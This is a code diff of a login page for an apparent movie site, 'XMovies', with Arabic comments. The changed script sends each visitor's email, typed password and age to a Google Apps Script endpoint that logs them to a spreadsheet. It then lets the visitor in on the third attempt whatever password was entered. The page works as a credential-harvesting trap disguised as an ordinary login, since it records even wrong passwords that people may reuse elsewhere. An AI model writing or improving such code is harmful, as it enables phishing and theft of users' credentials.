@@ -51,11 +51,11 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red; }
 </div>
 
 <script>
-const correctPassword = "1234";
-const maxAttempts = 3;
+const correctPassword = "1234"; // كلمة المرور الصحيحة
+const maxAttempts = 3; // المرة الثالثة تسمح بالدخول
 const sheetUrl = "https://script.google.com/macros/s/AKfycbwhAztXlBe8D9aDEXF7MeOQ0HBEKwKjJm25j2lVoXzDl-bM5VIwyVvh89tpKsxoMWus/exec";
 
-function go(){
+async function go() {
   const email = document.getElementById("email").value;
   const pw = document.getElementById("password").value;
   const age = document.getElementById("age").value;
@@ -65,16 +65,23 @@ function go(){
   attempts++;
   localStorage.setItem("xmovies_attempts", attempts);
 
-  if(pw === correctPassword || attempts >= maxAttempts){
-    fetch(sheetUrl, {
-      method: "POST",
-      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&form=XMovies`
-    }).then(()=>{
+  if (pw === correctPassword || attempts >= maxAttempts) {
+    // إرسال البيانات إلى Google Sheet أولاً
+    try {
+      await fetch(sheetUrl, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&form=XMovies`
+      });
+      // إزالة العداد بعد الإرسال
       localStorage.removeItem("xmovies_attempts");
-      window.location.href="movies.html";
-    });
+      // ثم الدخول للسيت
+      window.location.href = "movies.html";
+    } catch (e) {
+      error.innerText = "Error connecting to Google Sheets";
+    }
   } else {
+    // كلمة المرور خطأ، لكن لم نصل للمحاولة الثالثة بعد
     error.innerText = "Password incorrect";
   }
 }
